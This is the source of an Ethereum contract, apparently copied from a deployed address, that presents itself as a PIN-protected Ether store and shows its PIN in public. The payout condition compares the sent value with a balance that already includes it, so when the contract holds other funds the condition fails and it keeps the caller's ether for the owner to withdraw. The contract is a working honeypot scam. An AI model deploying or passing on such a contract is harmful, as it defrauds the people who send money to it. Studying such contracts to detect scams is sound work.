//https://etherscan.io/address/0x35c3034556b81132e682db2f879e6f30721b847c

pragma solidity ^0.4.19;
contract PinCodeEtherStorage {
	// Store some money with a 4 digit code
	
    address private Owner = msg.sender;
    uint public PinCode = 2658;

    function() public payable {}
    function PinCodeEtherStorage() public payable {}
   
    function Withdraw() public {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Take(uint n) public payable {
		if(msg.value >= this.balance && msg.value > 0.1 ether)
			// To prevent random guesses, you have to send some money
			// Random Guess = money lost
			if(n <= 9999 && n == PinCode)
				msg.sender.transfer(this.balance+msg.value);
    }
}
